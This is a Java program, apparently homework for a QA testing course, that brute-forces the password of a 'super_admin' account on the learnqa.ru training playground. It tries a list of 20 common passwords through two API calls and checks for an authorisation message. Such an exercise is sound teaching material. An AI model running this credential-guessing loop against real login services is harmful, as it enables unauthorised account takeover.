import org.apache.http.HttpResponse;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.StringEntity;
import org.apache.http.impl.client.HttpClients;
import org.apache.http.util.EntityUtils;

public class TestPass {
    public static void main(String[] args) {
        String login = "super_admin";
        String[] passwords = {
                "123456",
                "123456789",
                "12345",
                "qwerty",
                "password",
                "12345678",
                "111111",
                "123123",
                "1234567890",
                "1234567",
                "qwerty123",
                "000000",
                "1q2w3e",
                "aa12345678",
                "abc123",
                "password1",
                "1234",
                "qwertyuiop",
                "123321",
                "password123"
        };

        for (String password : passwords) {
            if (checkPassword(login, password)) {
                System.out.println("Правильный пароль: " + password);
                break;
            }
        }
    }

    public static boolean checkPassword(String login, String password) {
        try {
            HttpClient httpClient = HttpClients.createDefault();

            // Step 1: Вызываем первый метод для получения auth_cookie
            HttpPost postRequest1 = new HttpPost("https://playground.learnqa.ru/ajax/api/get_secret_password_homework");
            postRequest1.addHeader("Content-Type", "application/json");
            StringEntity requestEntity1 = new StringEntity(
                    String.format("{\"login\":\"%s\",\"password\":\"%s\"}", login, password));
            postRequest1.setEntity(requestEntity1);

            HttpResponse response1 = httpClient.execute(postRequest1);
            String responseBody1 = EntityUtils.toString(response1.getEntity());

            // Step 2: Вызываем второй метод для проверки auth_cookie
            HttpPost postRequest2 = new HttpPost("https://playground.learnqa.ru/ajax/api/check_auth_cookie");
            postRequest2.addHeader("Content-Type", "application/json");
            postRequest2.addHeader("Cookie", "auth_cookie=" + responseBody1);

            HttpResponse response2 = httpClient.execute(postRequest2);
            String responseBody2 = EntityUtils.toString(response2.getEntity());

            if (responseBody2.contains("You are authorized")) {
                System.out.println("Правильный пароль найден: " + password);
                return true;
            }
        } catch (Exception e) {
            e.printStackTrace();
        }

        return false;
    }
}





